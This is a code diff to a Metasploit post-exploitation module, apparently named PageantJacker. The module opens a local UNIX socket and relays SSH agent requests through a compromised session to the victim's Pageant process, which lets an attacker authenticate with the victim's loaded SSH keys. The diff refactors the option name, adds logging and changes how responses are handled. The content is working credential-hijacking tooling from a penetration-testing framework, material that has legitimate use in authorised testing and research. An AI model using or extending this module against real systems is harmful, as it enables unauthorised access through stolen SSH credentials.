@@ -24,7 +24,7 @@ class Metasploit3 < Msf::Post
       ))
     register_options(
       [
-        OptString.new('SOCKETPATH', [false, 'Specify a filename for the local UNIX socket.', nil]),
+        OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil]),
       ], self.class)
   end
 
@@ -54,19 +54,23 @@ class Metasploit3 < Msf::Post
     end 
 
     ::UNIXServer.open(@sockpath) {|serv|
-      print_status("Launched listening socket on #{@sockpath}.")
+      print_status("Launched listening socket on #{@sockpath}")
       print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
       print_status("Now use any tool normally (e.g. ssh-add)")
 
-      print_status("Setting SSH_AUTH_SOCK to #{@sockpath}")
-      ENV['SSH_AUTH_SOCK'] = @sockpath 
       loop { 
         s = serv.accept
         loop {
           socket_request_data = s.recvfrom(8192)
           break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
-          response_data = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
-          s.send response_data,0 if !response_data.nil?
+          vprint_status("PageantJacker: Received data from socket (Size: #{socket_request_data.first.size})")
+          response = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
+          if response[:success]
+            if response[:blob]
+                s.send response[:blob],0 
+            end
+          end
+          vprint_status("PageantJacker: Success='#{response[:success]}', Error=>'#{response[:error]}'")
         }   
       }   
     }   
